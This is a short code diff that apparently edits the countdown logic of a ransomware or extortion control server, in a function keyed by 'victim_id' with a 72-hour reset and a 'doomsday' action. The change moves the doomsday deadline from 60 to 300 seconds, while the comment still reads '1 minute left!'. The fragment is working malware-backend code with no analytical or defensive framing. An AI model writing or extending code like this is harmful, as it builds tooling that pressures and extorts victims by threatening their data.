@@ -423,7 +423,7 @@ def update_timer(victim_id, action):
     elif action == 'reset':
         new_time = 72 * 3600
     elif action == 'doomsday':
-        new_time = 60 # 1 minute left!
+        new_time = 60 * 5 # 1 minute left!
     else:
         return "Invalid action", 400
         
